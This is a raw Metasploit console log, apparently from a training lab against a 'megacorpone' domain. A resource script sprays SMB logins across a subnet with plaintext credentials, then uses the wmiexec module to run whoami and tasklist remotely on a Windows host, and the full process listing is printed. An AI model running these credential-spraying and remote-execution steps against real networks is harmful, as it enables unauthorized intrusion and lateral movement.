[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-                                                  
[0m[36m[0m[37m
  Metasploit Park, System Security Interface
  Version 4.0.5, Alpha E
  Ready...
  > [1maccess security[0m
  access: PERMISSION DENIED.
  > [1maccess security grid[0m
  access: PERMISSION DENIED.
  > [1maccess main security grid[0m
  access: PERMISSION DENIED....and...
  [31mYOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD![0m
[0m

       =[ [33mmetasploit v6.1.22-dev[0m                          ]
+ -- --=[ 2188 exploits - 1161 auxiliary - 400 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: View all productivity tips with the 
[32mtips[0m command

[?1034h[4mmsf6[0m [0m> resource resource1.rc
resource resource1.rc
[0m[1m[34m[*][0m Processing /root/resource1.rc for ERB directives.
resource (/root/resource1.rc)> use auxiliary/scanner/smb/smb_login
smbclient //172.22.117.20/C$ -U megacorpone/tstark
[0mresource (/root/resource1.rc)> set SMBUser tstark
[0mSMBUser => tstark
resource (/root/resource1.rc)> set SMBPass Password!
[0mSMBPass => Password!
resource (/root/resource1.rc)> set SMBDomain megacorpone
[0mSMBDomain => megacorpone
resource (/root/resource1.rc)> set RHOSTS 172.22.117.0/24
[0mRHOSTS => 172.22.117.0/24
resource (/root/resource1.rc)> use scanner/smb/impacket/wmiexec
[0msmbclient //172.22.117.20/C$ -U megacorpone/tstark
resource (/root/resource1.rc)> set RHOSTS 172.22.117.20
[0mRHOSTS => 172.22.117.20
resource (/root/resource1.rc)> set SMBDomain megacorpone
[0mSMBDomain => megacorpone
resource (/root/resource1.rc)> set SMBPass Password!
[0mSMBPass => Password!
resource (/root/resource1.rc)> set SMBUser tstark
[0mSMBUser => tstark
resource (/root/resource1.rc)> set COMMAND whoami
[0mCOMMAND => whoami
resource (/root/resource1.rc)> run
[0m
[1m[34m[*][0m Running for 172.22.117.20...
[1m[34m[*][0m 172.22.117.20 - SMBv3.0 dialect used
[1m[34m[*][0m megacorpone\tstark

[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
[1m[34m[*][0m Auxiliary module execution completed
resource (/root/resource1.rc)> set COMMAND tasklist
[0mCOMMAND => tasklist
resource (/root/resource1.rc)> run
[0m[1m[34m[*][0m Running for 172.22.117.20...
[1m[34m[*][0m 172.22.117.20 - SMBv3.0 dialect used
[1m[34m[*][0m 
Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          8 K
System                           4 Services                   0         32 K
Registry                        72 Services                   0     11,300 K
smss.exe                       360 Services                   0        236 K
csrss.exe                      460 Services                   0      1,884 K
wininit.exe                    528 Services                   0        456 K
csrss.exe                      536 Console                    1        892 K
winlogon.exe                   600 Console                    1        960 K
services.exe                   628 Services                   0      5,920 K
lsass.exe                      664 Services                   0     11,548 K
svchost.exe                    752 Services                   0     15,896 K
fontdrvhost.exe                760 Console                    1         88 K
fontdrvhost.exe                772 Services                   0        216 K
svchost.exe                    852 Services                   0     10,012 K
LogonUI.exe                    936 Console                    1     14,460 K
dwm.exe                        944 Console                    1     11,408 K
svchost.exe                    980 Services                   0     62,176 K
svchost.exe                   1016 Services                   0      6,384 K
svchost.exe                    428 Services                   0     13,340 K
svchost.exe                    448 Services                   0     14,816 K
svchost.exe                    524 Services                   0     14,196 K
svchost.exe                    716 Services                   0      1,864 K
svchost.exe                    392 Services                   0     10,800 K
svchost.exe                   1156 Services                   0     11,336 K
svchost.exe                   1300 Services                   0      3,808 K
Memory Compression            1608 Services                   0     67,756 K
VSSVC.exe                     1652 Services                   0      2,268 K
svchost.exe                   1664 Services                   0      3,212 K
svchost.exe                   1776 Services                   0      2,036 K
svchost.exe                   1784 Services                   0      3,208 K
spoolsv.exe                   1932 Services                   0      4,492 K
svchost.exe                   1972 Services                   0     13,556 K
svchost.exe                   2160 Services                   0      6,664 K
svchost.exe                   2256 Services                   0      3,120 K
svchost.exe                   2348 Services                   0     26,644 K
MsMpEng.exe                   2396 Services                   0     93,988 K
svchost.exe                   2536 Services                   0      2,440 K
svchost.exe                   1288 Services                   0      1,172 K
csrss.exe                     2612                            2      1,884 K
winlogon.exe                  2868                            2      1,900 K
dwm.exe                       1236                            2     20,436 K
fontdrvhost.exe               2108                            2        936 K
svchost.exe                   3164 Services                   0      7,660 K
NisSrv.exe                    3204 Services                   0      4,528 K
svchost.exe                   2364 Services                   0     12,024 K
MoUsoCoreWorker.exe           3608 Services                   0     18,600 K
MicrosoftEdgeUpdate.exe       3200 Services                   0      1,888 K
SgrmBroker.exe                2492 Services                   0      3,804 K
uhssvc.exe                    1768 Services                   0        904 K
svchost.exe                   3328 Services                   0      4,164 K
SearchIndexer.exe             3528 Services                   0     15,056 K
svchost.exe                   5060 Services                   0      2,188 K
rdpclip.exe                   1448                            2      3,316 K
sihost.exe                    4348                            2     12,480 K
svchost.exe                   4340                            2     12,396 K
taskhostw.exe                 3508                            2      6,024 K
ctfmon.exe                    4884                            2      3,496 K
explorer.exe                   712                            2     65,232 K
svchost.exe                   4908                            2      4,832 K
SearchApp.exe                 3752                            2        824 K
RuntimeBroker.exe             3616                            2     14,036 K
StartMenuExperienceHost.e     4580                            2        524 K
RuntimeBroker.exe             3632                            2      6,360 K
SearchApp.exe                 3396                            2     38,604 K
RuntimeBroker.exe             5220                            2     10,508 K
SecurityHealthSystray.exe     5464                            2      3,092 K
SecurityHealthService.exe     5492 Services                   0      8,188 K
